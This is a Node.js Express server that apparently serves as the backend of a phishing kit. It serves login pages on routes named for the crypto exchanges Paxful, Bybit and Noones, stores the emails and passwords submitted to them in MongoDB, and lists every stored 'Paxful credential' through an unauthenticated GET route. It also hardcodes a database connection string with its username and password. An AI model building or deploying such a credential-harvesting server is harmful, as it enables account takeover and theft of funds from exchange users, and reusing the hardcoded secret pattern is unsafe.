const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const Item = require('./models/item');
const Paxful = require('./models/paxful');


const app = express();

mongoose.connect('mongodb+srv://vooke:vooke@cluster0.eqy0esa.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }).then(() => {
    console.log('Connected to MongoDB');
  }).catch((err) => {
    console.error('Error connecting to MongoDB', err);
  });

  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

// POST route to store data in MongoDB
  app.post('/items', async (req, res) => {
    try {
      const { name, description, price } = req.body;
  
      const newItem = new Item({
        name,
        description,
        price,
      });
  
      await newItem.save();
      res.status(201).json({ message: 'Item created successfully' });
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: 'Error creating item' });
    }
  });

  app.post('/paxful', async (req, res) => {
    try {
      const { email, password } = req.body;
  
      const newPaxful = new Paxful({
        email,
        password
      });
  
      await newPaxful.save();
      res.status(201).json({ message: 'Item created successfully' });
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: 'Error creating item' });
    }
  });
  
  // GET route to retrieve data from MongoDB
  app.get('/items', async (req, res) => {
    try {
      const items = await Item.find(); // Retrieve all items
      res.json(items);
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: 'Error fetching items' });
    }
  });
  
  app.get('/paxful', async (req, res) => {
    try {
      const paxfuls = await Paxful.find(); // Assuming you use Mongoose
      res.json(paxfuls);
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch Paxful credentials' });
    }
  });
  

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/noones', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'item.html'));
});

app.get('/bybit', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/loginspaxful', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'loginspaxful.html'));
});

app.use((req, res) => {
    res.status(404);
    res.send(`<h1>Error 404: Resource not found</h1>`)
})

app.listen(3000, () => {
    console.log('App listening on port 3000');
})